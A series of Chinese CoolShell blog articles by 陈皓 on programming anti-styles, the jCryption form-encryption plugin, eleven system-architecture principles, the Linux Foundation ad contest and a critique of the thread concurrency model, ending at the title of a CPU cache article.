Cargo Cult 编程是一种非常流行的编程方法，使用这种方法的程序员会学习其它编程高手的编程方法，虽然他们并不知道为什么高手们要那样做，但是他们觉得那样做可以让程序工作起来。举个例子，当时有大量的程序员在J2EE出现的第一年中过度地使用了EJBs和Entity Beans。#### 刻舟求剑编程刻舟求剑是一个很流行的寓言了。这种风格的编程在程序员的圈子里是非常常见的。比如，有一天，你发现了一个空指会的异常，于是你到了产生空指针异常的地方，简单地放上一个判断： `if (p != NULL)。`是的，这样的fix可以让你的程序工作起来，但你并没有真正地解决问题。你只不过是在你的船边记下了剑掉下去的位置，这样做只不过把问题隐藏起来，最终只会让你的程序的行为变得神出鬼没。你应该找到为什么指针会为空的原因，然后再解决这个问题。#### 设计模式驱动型编程正如这种编程的名字所说的，这种编程风格使用大量的设计模式，在你的程序中，四处都是设计模式，你的代码到处都是Facade，Observer ，Strategy，Adapter，等等等等。于是，你的程序要处理的业务逻辑被这些设计模式打乱得无法阅读，最后，也不知道是业务需求重来，还是设计模式重要，总之，实际业务需求的程序逻辑被各种设计模式混乱得不堪入目。
#### 侦探型编程在解决一个Bug的时候，侦探型程序员会调查这个Bug的原因。然后，则调查引发这个BUG的原因的原因。再然后，其会分析修正代码后是否会导致其它代码失败的因果关系。再然后然后，他会使用文本搜索查找所有使用这个改动的代码，并继续查找更上一级的调用代码。最后，这个程序员会写下30个不同的情形的测试案例，就算这些测试案例和那个Bug没有什么关系，最最后，这个程序员有了足够多的信心，并且精确地修正了一个拼写错误。与此同时，其它一个正常的程序修正了其它5个Bug。#### 屠宰式编程使用这种风格的程序员，对重构代码有着一种难以控制的极端冲动。他们几乎会重构所有经手的代码。就算是在产品在Release的前夜，当他在修正几个拼写错误的bug同时，其会修改10个类，以及重构与这10个类有联系的另20个类，并且修改了代码的build脚本，以及5个部署描述符。文章：来源   （全文完）# Javascripts加密库作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn一般说来，使用HTTP协议是不加密的，所有的数据都是以纯文本方式提交的，就算是你提交数据时，也是使用纯文本的方式发送。只有HTTPS协议会有SSL加密数据，但一般来说，HTTPS需要服务器端进行SSL设置，并有些麻烦。而jCryption这个jQuery插件能够加密由Forms提交的POST/GET数据。jCryption使用RSA公钥密码算法加密，另外，该项目还提供一个PHP文件来处理数据的解密。
这个库是一个开源库，也是一个同时使用MIT和GPL协议的项目。你需要注意的是，这个库无法取代SSL，使用这个库，你依然可能受到MITM攻击（中间人攻击 Man-in-the-middle- attacks）主页：   下载：http://code.google.com/p/jcryption/downloads/list   示例：# 我做系统架构的一些原则作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn工作 20 多年了，这 20 来年看到了很多公司系统架构，也看到了很多问题，在跟这些公司进行交流和讨论的时候，包括进行实施和方案比较的时候，都有很多各种方案的比较和妥协，因为相关的经历越来越多，所以，逐渐形成了自己的逻辑和方法论。今天，想写下这篇文章，把我的这些个人的经验和想法总结下来，希望能够让更多的人可以参考和借鉴，并能够做出更好的架构来。另外，我的这些思维方式和原则都针对于现有市面上众多不合理的架构和方案，所以，也算是一种“纠正”……（注意，这篇文章所说的这些架构上的原则，一般适用于相对比较复杂的业务，如果只是一些简单和访问量不大的应用，那么你可能会得出相反的结论）
目录* 原则一：关注于真正的收益而不是技术本身   * 原则二：以应用服务和 API 为视角，而不是以资源和技术为视角   * 原则三：选择最主流和成熟的技术   * 原则四：完备性会比性能更重要   * 原则五：制定并遵循服从标准、规范和最佳实践   * 原则六：重视架构扩展性和可运维性   * 原则七：对控制逻辑进行全面收口   * 原则八：不要迁就老旧系统的技术债务   * 原则九：不要依赖自己的经验，要依赖于数据和学习   * 原则十：千万要小心 X – Y 问题，要追问原始需求   * 原则十一：激进胜于保守，创新与实用并不冲突#### 原则一：关注于真正的收益而不是技术本身对于软件架构来说，我觉得第一重要的是架构的收益，如果不说收益，只是为了技术而技术，而没有任何意义。对于技术收益来说，我觉得下面这几个收益是非常重要的：* **是否可以降低技术门槛加快整个团队的开发流程** 。能够加快整个团队的工程流程，快速发布，是软件工程一直在解决的问题，所以，系统架构需要能够进行并行开发，并行上线和并行运维，而不会让某个团队成为瓶颈点。（注：就算拖累团队的原因是组织构架，也不妨碍我们做出并行的系统架构设计）   * **是否可以让整个系统可以运行的更稳定** 。要让整个系统可以运行的更为的稳定，提升整个系统的 SLA，就需要对有计划和无计划的停机做相应的解决方案（参看《关于高可用的架构》）   * **是否可以通过简化和自动化降低成本** 。最高优化的成本是人力成本，人的成本除了慢和贵，还有经常不断的 human error。如果不能降低人力成本，反而需要更多的人，那么这个架构设计一定是失败的。除此之外，是时间成本，资金成本。
如果一个系统架构不能在上面三个事上起到作用，那就没有意义了。#### 原则二：以应用服务和 API 为视角，而不是以资源和技术为视角国内很多公司都会有很多分工，基本上都会分成运维和开发，运维又会分成基础运维和应用运维，开发则会分成基础核心开发和业务开发。不同的分工会导致完全不同的视角和出发点。比如，基础运维和开发的同学更多的只是关注资源的利用率和性能，而应用运维和业务开发则更多关注的是应用和服务上的东西。这两者本来相关无事，但是因为分布式架构的演进，导致有一些系统已经说不清楚是基础层的还是应用层的了，比如像服务治理上的东西，里面即有底层基础技术，也需要业务的同学来配合，包括 k8s 也样，里面即有底层的如网络这样的技术，也有需要业务配合的 readniess和 liveness 这样的健康检查，以及业务应用需要 configMap 等等 ……**这些东西都让我感觉到所谓 DevOps，其实就是因为很多技术和组件已经分不清是 Dev 还是 Ops 的了，所以，需要合并 Dev和 Ops** 。而且，整个组织和架构的优化，已经不能通过调优单一分工或是单一组件能够有很大提升的了。其需要有一种自顶向下的，整体规划，统一设计的方式，才能做到整体的提升（可以试想一下城市交通的优化，当城市规模到一定程度的时候，整体的性能你是无法通过优化几条路或是几条街区来完成的，你需要对整个城市做整体的功能体的规划才可能达到整体效率的提升）。而为了做到整体的提升，需要所有的人都要有一个统一的视角和目标，这几年来，我觉得这个目标就是—— **要站在服务和 对外API的视角来看问题，而不是技术和底层的角度。**
#### 原则三：选择最主流和成熟的技术技术选型是一件很重要的事，技术一旦选错，那会导致整个架构需要做调整，而对架构的调整重来都不是一件简单的事，我在过去几年内，当系统越来越复杂的时候，用户把他们的 PHP，Python, .NET，或 Node.js 的架构完全都迁移到 Java + Go 的架构上来的案例不断的发生。这个过程还是非常痛苦的，但是你没有办法，当你的系统越来越复杂，越来越大时，你就再也不能在一些玩具技术上玩了，你需要的更为工业化的技术。* **尽可能的使用更为成熟更为工业化的技术栈，而不是自己熟悉的技术栈** 。 所谓工业化的技术栈，你可以看看大多数公司使用的技术栈，比如：互联网，金融，电信……等等 ，大公司会有更多的技术投入，也需要更大规模的生产，所以，他们使用的技术通常来说都是比较工业化的。在技术选型上，千万不要被——“你看某个视频公司也在用这个技术”，或是一些在论坛上看到的一些程序员吐槽技术的观点（没有任何的数据，只有自己的喜好）来决定自己的技术，还是看看主流大多数公司实际在用的技术栈，会更靠谱一些。   * **选择全球流行的技术，而不是中国流行的技术** 。技术这个东西一定是一个全球化的东西，不是一个局域化的事。所以，一定要选国际化的会更好。另外，千万不要被某些公司的“特别案例”骗过去了，那怕这个案例很性感，关键还是要看解决问题的思路和采用的技术是否具有普世性。只有普世性的技术有更强的生命力。   * **尽可能的使用红利大的主流技术，而不要自己发明轮子，更不要魔改** 。我见过好些个公司魔改开源软件，比如有个公司同魔改mesos，最后改着改着发现自己发明另一个 kubernetes。我还见过很多公司或技术团队喜欢自己发明自己的专用轮子，最后都会被主流开源软件所取代。完全没有必要。不重新发明轮子，不魔改，不是因为自己技术不能，而是因为，这个世界早已不是自己干所有事的年代了，这个时代是要想尽方法跟整个产业，整个技术社区融合和合作，这样才会有最大的收益。那些试图因为某个特例需要自成一套的玩法，短期没问题，但长期来说，我都不看好。   * **绝大多数情况下，如无非常特殊要求，选 Java基本是不会错的** 。一方面，这是因为 Java 的业务开发的生产力是非常好的，而且有 Spring 框架保障，代码很难写烂，另外，Java 的社区太成熟了，你需要的各种架构和技术都可以很容易获得，技术红利实在是太大。这种运行在JVM上的语言有太多太多的好处了。在 Java 的技术栈上，你的架构风险和架构的成本（无论是人力成本，时间成本和资金成本）从长期来说都是最优的
在我见过的公司中，好些公司的架构都被技术负责人个人的喜好、擅长和个人经验给绑架了，完全不是从一个客观的角度来进行技术选型。其实，从 0 到 1 的阶段，你用什么样的技术都行，如果你做一个简单的应用，没有事务处理没有复杂的交易流程，比如一些论坛、社交之类的应用，你用任何语言都行。但是如果有一天你的系统变复杂了，需要处理交易了，量也上来了，从 1 到 10，甚至从 10 到 100，你的开发团队也变大了，需要构建的系统越来越大，你可能会发现你只有一个选择，就是 Java。想想京东从.NET 到 Java，淘宝从 PHP 到 Java……注，一些有主观喜好的人一定会对我上述对 Java 的描述感到不适，我还用一些证据说明一下——全中国所有的电商平台，几百家银行，三大电信运营商，所有的保险公司，劵商的系统，医院里的系统，电子政府系统，等等，基本都是用 Java 开发的，包括 AWS 的主流语言也是 Java，阿里云一开始用 C++/Python 写控制系统，后面也开始用 Java ……你可能会说 B站是用 go语言，但是你可能不知道 B 站的电商和大数据是用 Java……懂着数据分析的同学，建议上各大招聘网站上搜一下 Java 的职位数量，你就知道某个技术是否主流和热门……
#### 原则四：完备性会比性能更重要我发现好些公司的架构师做架构的时候，首要考虑的是架构的性能是否能够撑得住多大多大的流量，而不是考虑系统的完备性和扩展性。所以，我已经多次见过这样的案例了，一开始直接使用 MongoDB 这样的非关系型数据库，或是把数据直接放在 Redis 里，而直接放弃关系型数据库的数据完备性的模型，而在后来需要在数据上进行关系查询的时候，发现 NoSQL 的数据库在 Join 上都表现的太差，然后就开始各种飞线，为了不做 Join 就开始冗余数据，然而自己又维护不好冗余数据后带来的数据一致性的问题，导致数据上的各种错乱丢失。所以，我给如下的一些如下的架构原则：* **使用最科学严谨的技术模型为主，并以不严谨的模型作为补充** 。对于上面那个案例来说，就是——永远使用完备支持 ACID 的关系型数据库，然后用 NoSQL 作补充，而不是完全放弃关系型数据库。这里的原则就是所谓的“先紧后松”，一开始紧了，你可以慢慢松，但是开始松了，以后你想紧再也紧不过来了。   * **性能上的东西，总是有很多解的** 。我这么多年的经历告诉我，性能上的事，总是有解的，手段也是最多的，这个比起架构的完备性和扩展性来说真的不必太过担心。
为了追求所谓的性能，把整个系统的完备性丢失掉，相当地得不偿失。#### 原则五：制定并遵循服从标准、规范和最佳实践这个原则是非常重要的，因为只有服从了标准，你的架构才能够有更好的扩展性。比如：我经常性的见到很多公司的系统既没有服从业界标准，也没有形成自己公司的标准，感觉就像一群乌合之众一样。最典型的例子就是 HTTP 调用的状态返回码。业内给你的标准是 200表示成功，3xx 跳转，4xx 表示调用端出错，5xx 表示服务端出错，我实在是不明白为什么无论成功和失败大家都喜欢返回 200，然后在 body 里指出是否error（前两年我在微信公众号里看到一个有一定名气的互联网老兵推荐使用无论正确还是出错都返回 200 的做法，我在后台再三确认后，我发现这样的架构师真是害人不浅）。这样做最大的问题是——监控系统将在一种低效的状态下工作。监控系统需要把所有的网络请求包打开后才知道是否是错误，而且完全不知道是调用端出错还是服务端出错，于是一些像重试或熔断这样的控制系统完全不知道怎么搞（如果是 4xx错，那么重试或熔断是没有意义的，只有 5xx 才有意义）。 **有时候，我会有种越活越退步的感觉，错误码设计这种最基本最基础的东西为什么会没有？并且一个公司会任由着大家乱来？这些基础技能怎么就这样丢掉了？**
还有，我还见过一些公司，他们整个组织没有一个统一的用户 ID 的设计，各个系统之间同步用户的数据是通过用户的身份证 ID，是的，就是现实世界的身份证 ID，包括在网关上设置的用户白名单居然也是用身份证 ID。我对这个公司的内的用户隐私管理有很大的担忧。一个企业，一个组织，如果没有标准和规范，也就会有抽象，这一定是要出各种乱子的。下面，我罗列一些你需要注意的标准和规范（包括但不限于）：* **服务间调用的协议标准和规范** 。这其中包括 Restful API路径, HTTP 方法、状态码、标准头、自定义头等，返回数据 JSon Scheme……等。   * **一些命名的标准和规范** 。这其中包括如：用户 ID，服务名、标签名、状态名、错误码、消息、数据库……等等   * **日志和监控的规范** 。这其中包括：日志格式，监控数据，采样要求，报警……等等   * **配置上的规范** 。这其中包括：操作系统配置、中间件配置，软件包……等等   * **中间件使用的规范** 。数据库，缓存、消息队列……等等   * **软件和开发库版本统一** 。整个组织架构内，软件或开发库的版本最好每年都升一次级，然后在各团队内统一。
这里重要说一下两个事：* **Restful API 的规范** 。我觉得是非常重要的，这里给两个我觉得写得最好的参考：Paypal 和 Microsoft 。Restful API 有一个标准和规范最大的好处就是监视可以很容易地做各种统计分析，控制系统可以很容易的做流量编排和调度。   * **另一个是服务调用链追踪** 。对于服务调用链追踪来说，基本上都是参考于 Google Dapper 这篇论文，目前有很多的实现，最严格的实现是 Zipkin，这也是 Spring Cloud Sleuth 的底层实现。Zipkin 贴近 Google Dapper 论文的好处在于——无状态，快速地把 Span 发出来，不消耗服务应用侧的内存和 CPU。这意味着，监控系统宁可自己死了也不能干扰实际应用。   * **软件升级** 。我发现很多公司包括 BAT，他们完全没有软件升级的活动，全靠开发人员自发。然而，这种成体系的活动，是永远不可能靠大众的自发形成的。一个公司至少一年要有一次软件版本升级的review，然后形成软件版本的统一和一致，这样会极太简化系统架构的复杂度。#### 原则六：重视架构扩展性和可运维性
在我见过很多架构里，技术人员只考虑当下，但从来不考虑系统的未来扩展性和可运维性。所谓的管生不管养。如果你生下来的孩子胳膊少腿，严重畸形，那么未来是很难玩的。因为架构和软件不是写好就完的，是需要不断修改不断维护的，80%的软件成本都是在维护上。所以，如何让你的架构有更好的扩展性，可以更容易地运维，这个是比较重要的。所谓的扩展性，意味着，我可以很容易地加更多的功能，或是加入更多的系统，而所谓可运维，就是说我可以对线上的系统做任意的变更。扩展性要求的是有标准规范且不耦合的业务架构，可运维性要求的则是可控的能力，也就是一组各式各样的控制系统。* **通过服务编排架构来降低服务间的耦合** 。比如：通过一个业务流程的专用服务，或是像 Workflow，Event Driven Architecture ， Broker，Gateway，Service Discovery 等这类的的中间件来降低服务间的依赖关系。   * **通过服务发现或服务网关来降低服务依赖所带来的运维复杂度** 。服务发现可以很好的降低相关依赖服务的运维复杂度，让你可以很轻松的上线或下线服务，或是进行服务伸缩。   * **一定要使用各种软件设计的原则** 。比如：像SOLID这样的原则（参看《一些软件设计的原则》），IoC/DIP，SOA 或 Spring Cloud 等 架构的最佳实践（参看《SteveY对Amazon和Google平台的吐槽》中的 Service Interface 的那几条军规），分布式系统架构的相关实践（参看：《分布式系统的事务处理》，或微软件的 《Cloud Design Patterns》）……等等
#### 原则七：对控制逻辑进行全面收口所有的程序都会有两种逻辑，一种是业务逻辑，一种是控制逻辑，业务逻辑就是完成业务的逻辑，控制逻辑是辅助，比如你用多线程，还是用分布式，是用数据库还是用文件，如何配置、部署，运维、监控，事务控制，服务发现，弹性伸缩，灰度发布，高并发，等等，等等 ……这些都是控制逻辑，跟业务逻辑没有一毛钱关系。控制逻辑的技术深度会通常会比业务逻辑要深一些，门槛也会要高一些，所以，最好要专业的程序员来负责控制逻辑的开发，统一规划统一管理，进行收口。这其中包括：* **流量收口** 。包括南北向和东西向的流量的调度，主要通过流量网关，开发框架 SDK或 Service Mesh 这样的技术。   * **服务治理收口** 。包括：服务发现、健康检查，配置管理、事务、事件、重试、熔断、限流……主要通过开发框架 SDK – 如：Spring Cloud，或服务网格Service Mesh等技术。   * **监控数据收口** 。包括：日志、指标、调用链……主要通过一些标准主流的探针，再加上后台的数据清洗和数据存储来完成，最好是使用无侵入式的技术。监控的数据必须统一在一个地方进行关联，这样才会产生信息。   * **资源调度有应用部署的收口** 。包括：计算、网络和存储的收口，主要是通过容器化的方案，如k8s来完成。   * **中间件的收口** 。包括：数据库，消息，缓存，服务发现，网关……等等。这类的收口方式一般要在企业内部统一建立一个共享的云化的中间件资源池。
对此，这里的原则是：* **你要选择容易进行业务逻辑和控制逻辑分离的技术** 。这里，Java 的 JVM+字节码注入+AOP 式的Spring 开发框架，会带给你太多的优势。   * **你要选择可以享受“前人种树，后人乘凉”的有技术红利的技术** 。如：有庞大社区而且相互兼容的技术，如：Java, Docker, Ansible，HTTP，Telegraf/Collectd……   * **中间件你要使用可以 支持HA集群和多租户的技术** 。这里基本上所有的主流中间件都会支持 HA 集群方式的。#### 原则八：不要迁就老旧系统的技术债务我发现很多公司都很非常大的技术债务，这些债务具体表现如下：* **使用老旧的技术** 。比如，使用HTTP1.0， Java 1.6，Websphere，ESB，基于 socket的通讯协议，过时的模型……等等   * **不合理的设计** 。比如，在 gateway 中写大量的业务逻辑，单体架构，数据和业务逻辑深度耦合，错误的系统架构（把缓存当数据库，用消息队列同步数据）……等等   * **缺少配套设施** 。比如，没有自动化测试，没有好的软件文档，没有质量好的代码，没有标准和规范……等等
来找我寻求技术帮助的人都有各种各样的问题。我都会对他们苦口婆心地说同样的一句话——“ **如果你是来找我 case-by-case 解决问题，我兴趣不大，因为，你们千万不要寄希望能够很简单的把一辆夏利车改成一辆法拉利跑车，或是把一栋地基没打好的歪楼搞正。以前欠下的技术债，都得要还，没打好的地基要重新打，没建配套设施都要建。这些基础设施如果不按照正确科学的方式建立的话，你是不可能有一个好的的系统，我也没办法帮你 case-by-case 的解决问题……** ”，一开始，他们都会对我说，没问题，我们就是要还债，但是，最后发现要还的债真多，有点承受不了，就开始现原形了。他们开始为自己的“欠的技术债”找各种合理化的理由——给你解释各种各样的历史原因和不得以而为之的理由。谈着谈着，让我有一种感觉——他们希望得到一种什么都不改什么都不付出的方式就可以进步的心态，他们宁可让新的技术 low 下来迁就于这些技术债，把新的技术滥用地乱七八糟的。有一个公司，他们的系统架构和技术选型基本都搞错了，使用错误的模型构建系统，导致整个系统的性能非常之差，也才几千万条数据，但他们想的不是还债，不是把地基和配套设施建好，而且要把楼修的更高，上更多的系统——他们觉得现有的系统挺好，性能问题的原因是他们没一个大数据平台，所以要建大数据平台……
我见过很多很多公司，包括大如 BAT 这样的公司，都会在原来的技术债上进行更多的建设，然后，技术债越来越大，利息越来越大，最终成为一个高利贷，再也还不了（我在《开发团队的效率》一文中讲过一个 WatchDog 的架构模式，一个系统烂了，不是去改这个系统，而是在旁边建一个系统来看着它，我很难理解为什么会有这样的逻辑，也许是为了要解决更多的就业……）这里有几个原则和方法我是非常坚持的，分享给大家：* **与其花大力气迁就技术债务，不如直接还技术债。是所谓的长痛不如短痛。**   * **建设没有技术债的“新城区”，并通过“防腐层 ”的架构模型，不要让技术债侵入“新城区”**。#### 原则九：不要依赖自己的经验，要依赖于数据和学习有好些人来找我跟我说他们的技术问题，然后希望我能够给他们一个答案。我说，我需要了解一下你现有系统的情况，也就是需要先做个诊断，我只有得到这些数据后，我才可能明白真正的原因是什么 ，我才可能给你做出一个比较好的技术方案。我个人觉得这是一种对对方负责的方法，因为技术手段太多了，所有的技术手段都有适应的场景，并且有各种 trade- off，所以，只有调研完后才能做出决定。这跟医生看病是一样的，确诊病因不能靠经验，还是要靠诊断数据。在科学面前，所有的经验都是靠不住的……
另外，如果有一天你在做技术决定的时候，开始凭自己以往的经验，那么你就已经不可能再成长了。人都是不可能通过不断重复过去而进步的，人的进步从来都是通过学习自己不知道的东西。所以，千万不要依赖于自己的经验做决定。做任何决定之前，最好花上一点时间，上网查一下相关的资料，技术博客，文章，论文等 ，同时，也看看各个公司，或是各个开源软件他们是怎么做的？然后，比较多种方案的 Pros/Cons，最终形成自己的决定，这样，才可能做出一个更好的决定。#### 原则十：千万要小心 X – Y 问题，要追问原始需求对于 X-Y 问题，也就是说，用户为了解决 X问题，他觉得用 Y 可以解，于是问我 Y 怎么搞，结果搞到最后，发现原来要解决的 X 问题，这个时候最好的解决方案不是 Y，而是 Z。 这种 X-Y 问题真是相当之多，见的太多太多了。所以，每次用户来找我的时候，我都要不断地追问什么是 X 问题。比如，好些用户都会来问我他们要一个大数据流式处理，结果追问具体要解决什么样的问题时，才发现他们的问题是因为服务中有大量的状态，需要把相同用户的数据请求放在同一个服务上处理，而且设计上导致一个慢函数拖慢整个应用服务。最终就是做一下性能调优就好了，根本没有必要上什么大数据的流式处理。
我很喜欢追问为什么 ，这种追问，会让客户也跟着来一起重新思考。比如，有个客户来找我评估的一个技术架构的决定，从理论上来说，好像这个架构在用户的这个场景下非常不错。但是，这个场景和这个架构是我职业生涯从来没有见过的。于是，我开始追问这个为什么会是这么一个场景？当我追问的时候，我发现用户都感到这个场景的各种不合理。最后引起了大家非常深刻的研讨，最终用户把那个场景修正后，而架构就突然就变成了一个常见且成熟的的模型……#### 原则十一：激进胜于保守，创新与实用并不冲突我对技术的态度是比较激进的，但是，所谓的激进并不是瞎搞，也不是见新技术就上，而是积极拥抱会改变未来的新技术，如：Docker/Go，我就非常快地跟进，但是像区块链或是 Rust 这样的，我就不是很积极。因为，其并没有命中我认为的技术趋势的几个特征（参看《Go,Docker 和新技术 》）。当然，我也不是不喜欢的就不学了，我对区块链和 Rust 我一样学习，我也知道这些技术的优势，但我不会大规模使用它们。另外，我也尊重保守的决定，这里面没有对和错。但是，我个人觉得对技术激进的态度比起保守来说有太多的好处了。一方面来说，对于用户来说，很大程度上来说，新技术通常都表面有很好的竞争力，而且我见太多这样成功的公司都在积极拥抱新的技术的，而保守的通常来说都越来越不好。
有一些人会跟我说，我们是实用主义，我们不需要创新，能解决当下的问题就好，所以，我们不需要新技术，现有的技术用好就行了。这类的公司，他们的技术设计第一天就在负债，虽然可以解决当下问题，但是马上就会出现新的问题，然后他们会疲于解决各种问题。最后呢，最后还是会走到新的技术上。这里的逻辑很简单 —— **进步永远来自于探索，探索是要付出代价的，但是收益更大** 。对我而言，不敢冒险才是最大的冒险，不敢犯错才是最大的错误，害怕失去会让你失去的更多……（全文完）# Linux基金会的广告作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn**今年早些时候，Linux基金会发起了一项面向制作人和一般Linux爱好者的活动，创造60秒创意的广告并评奖。**Linux基金会并没有苹果和微软这样大的投入来聘请大腕，但这次评选出来的好广告却一点也不输于他们，Linux社团的参与力和灵感可见一斑。 **本次活动获胜的奖品是免费前往东京参与Linux专题研讨会，评奖结果是：**第一：“What does it mean to be free?”   第二：“The Origin,”   第三：“Linux pub”
下面是广告片的视频#### What does it mean to be free?#### The Origin (起源)#### Linux Pub下面的视频需要你能够访问YouTube（你可以上Google搜索如何访问YouTube的方法）还有很多很不错的作品，比如：* The Future is Open   * Challenges at the Office更多的视频，你可以上Linux基金会的网站上看看，也一样地非常地有创意。（全文完）# 读书笔记：对线程模型的批评作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn**——感谢Ian.Sian投递本文——**多线程模型是主流的并发编程模型。在过去几十年来，多线程模型一直是开发并发程序的有力工具。然而，它的历史并非总那么美好。1997年，NASA 的“火星探路者”号在执行任务的途中遭遇了严重的时序异常（参见 “What really happend on Mars“，注目 follow-up 中的现身说法），无法发回探测数据。如果不是 NASA 远程刷新了程序，它的结局就只能是报废在火星上。这一切都是由程序中潜藏的一个优先级反转 bug 造成的。更早的例子还有80年代的一系列 Therac-25 型医用粒子加速器事故。在这些加速器释放出的过量辐射照射之下，数位病人死亡。事后调查显示，至少有一次发生事故的原因，是加速器的控制软件中，存在一个只能由特定操作序列引发的竞争条件 bug。你也许认为这些只是陈年往事，但是直到现在，即便是世界500强公司们高价买来的信息系统，也同样避免不了这些问题。这导致许多程序员认为线程是个潘多拉魔盒，对它采取能躲就躲的态度。然而近来计算机的发展使得躲猫猫的空间越来越小：随便从市场上淘一个CPU，它里面也有不止一个核心。未来的程序员只会有越来越多的机会接触到并发编程，而无法再独善其身了。
加州大学伯克利分校教授，爱德华 A. 李在2006年做了一次题为《线程的麻烦 (The Problem with Threads)》的学术报告。在报告中他提到：看上去，多线程只是对核心语言的小小扩展，甚至可以以第三方库的形式存在。但实质上，多线程程序和原有的核心语言编写的程序已经完全不同了。其原因在于，由于多线程程序可能以任意的次序交错执行，程序再也无法像顺序执行时那样产生确定的结果。多线程程序容易编写(因为写的是顺序程序)，但是难分析，难调试，更容易出错。在我的想法中，产生问题的根源，是多线程模型作为对并发问题的一个抽象，是很不完善的。抽象的实质是对问题的转换。我们可以把抽象应用于一个问题，把它转换成另一个（或许）更简单的问题来解决。解决了转换后的简单问题，就意味着解决了原有的困难问题。严格来说，一个抽象一定要保存原有问题的结构，同时去除无关细节。但是，由于我们生活的世界并没有什么东西是完全“严格”的，现实中使用的抽象有时会隐藏解决问题的关键细节，或者残留一些不该漏出来的东西。评价一个抽象的好坏，也就不止是看它能节省多少代码，和它的界面有多优美这么简单，同时还要看看在一个问题被抽象转换之后，留了下来的细节还能不能好好地解决它。
我们可以从这个意义上理解为什么线程模型是个很糟糕的抽象。一方面，对解决问题很关键的细节（如执行次序）被隐藏起来并受到了粗暴的对待。另一方面，线程模型极力兼容顺序程序的设计思想也使得如共享变量这样的，与线程不兼容的细节依然残留在程序员们的视线之内。我们无力控制程序的执行次序，而我们程序的正确性却依赖于对共享变量的有序变更。可以说，线程提供给我们的抽象简直是千疮百孔。我们还能用它干活，只是因为我们手里还有加锁机制，而它可以部分地堵上线程模型的漏洞。讽刺的是，引入加锁机制解决问题的同时，又带来了新的问题，所以我们编写多线程程序总会遇上死锁，活锁，优先级反转……等等。同样作为并发编程问题的抽象，角色模型（Actor Model） 比线程模型好就好在，它的资源分享不像线程模型那样通过共享变量来进行。角色模型中的资源分享只能通过特定的机制（消息传递）来进行。你在角色模型里依然可能犯错误，如你可能制造死锁，也有可能造成优先级反转。但是没有共享变量就意味着没有了竞争条件，所以绝大部分资源也用不着上锁了。这样一来，原先至关重要的细节变得不那么重要，问题就这么解决了。一般来说，在修复一个糟糕的抽象时，可以采取的策略分如下两类：
* 把造成问题的那部分抽象拿掉，直接露出底层的细节   * 换一个和底层兼容性更好的抽象模型以 MapReduce 为例，它在解决分布式计算问题时，采取的是第一类策略。与现时流行的做法相反，MapReduce 并不试图制造计算是在单一场所完成的假象(流行话讲叫“云计算”)，相反它需要程序员自己把问题拆分到集群中不同的机器上。同时，它却隐藏了大量其他细节。这种另类策略导致批评 MapReduce “太底层，不通用” 的声音不绝于耳， 然而这正是 MapReduce 聪明的地方。它放弃面面俱到，集中精力于高效地解决一小类问题（这类问题与排序问题有类似的结构），同时对其他的问题故意视而不见。它的流行证明了这一策略的成功。角色模型，通信进程（Communicating Sequential Processes, CSP），以及函数式编程（FP）在应对并发编程问题时不约而同地选择了第二类策略。它们采用了与并发兼容性更好的抽象。角色模型与通信进程从线程模型的问题中抹去了共享变量，纯粹 FP 则抹掉了“变量”的可变性。CSP 还可以降低程序执行次序的不确定性（因为在CSP中执行次序默认是确定的，不确定性必须在程序设计时显式声明）。由于这些努力，这几种模型都避免了落入线程模型的麻烦中，得到了对并发问题的更优美的解法。我们可以说，这些模型提供的抽象比线程模型的都要好。很遗憾的是，它们尽管优美，但却乏人问津。角色模型与通信进程目前不被任何主流操作系统原生支持（微软在 Windows 7 附带的新并行运行时 ConcRT 中加入了基于角色模型的 Asynchronous Agents Library，使得状况稍微改观了一点）。FP 的年岁几乎和计算机语言的历史一样古老， 但它的市场份额直到现在也小得可怜。
也许一切都是因为线程模型表面上那迷惑人的简单性，以及墨菲定律的变体：布劳尔技术惯性定律（已经成功的技术在新的，更好的技术出现时也会赖着不走）。我们曾经接纳了一个有缺点的解决方案，而现在我们被捆绑在这个方案上了。我们为线程模型写了成百上千万行的代码，而现在这些代码的重量束缚住我们的手脚，使得我们无法前行。解决线程模型带来的问题的正确做法，是推广新的，更完善的模型。既然解决问题的阻碍同时来自于新技术的低认知度和现有代码的拖累，很自然地有两个方面的工作要做。一、使得新技术更容易被多数程序员使用，二、想办法让现有的代码和新技术兼容。在兼容老代码这一头，我们已经有了一些行动。微软在 Windows 7 中提供一个称为用户模式调度 (UMS) 的功能。UMS 可以将内核模式的线程转换为用户模式线程，而应用程序可以自己提供一个 UMS 调度器来调度它们。这意味着，我们现在有机会重载掉系统调度器的默认行为，而根据应用自身的特点给出更合理的调度安排来。这个功能可以用在构造更容易使用的并发模型上，这样开发的模型可以与老代码兼容（但 UMS 有一个让人迷惑的限制：只能用在64bit 的Windows 7 版本上）。
同样地，在推广新技术方面，现在也有了很多成果。除了角色模型外，事务性内存(这又是一种避免竞争条件，从而避免加锁的方法)正在研究中；CSP 已经有了数个实现（如由 Kent 大学开发，针对 Java 的 JCSP），同时还有针对 CSP 的模型检证工具；至于 FP，最近因为人们认为 Web 系统的建模可以在函数式编程范式中更好的表达，FP 正在唤起人们的注意。我们缺的只剩下新技术的成功应用范例（实际上，前面的技术并不是没有成功范例，我们缺的是经验能够大规模运用的范例 ），以及一支理解这些技术的程序员大军了。对于这后一条，我甚至想，既然多线程编程唯一”容易”的事情是写代码，何不做出一种工具来让程序员们可以用写顺序程序的思维来在这些新模型中编写程序呢？这样的工具会帮助程序员利用线性程序的思维来理解代码，但是同时又让人注意到自己的改动正在影响系统的哪一部分。如果新模型的代码变得好理解了，也许更多的人会使用它们。（全文完）# 7个示例科普CPU Cache作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn**（感谢网友** **@我的上铺叫路遥** **翻译投稿）**
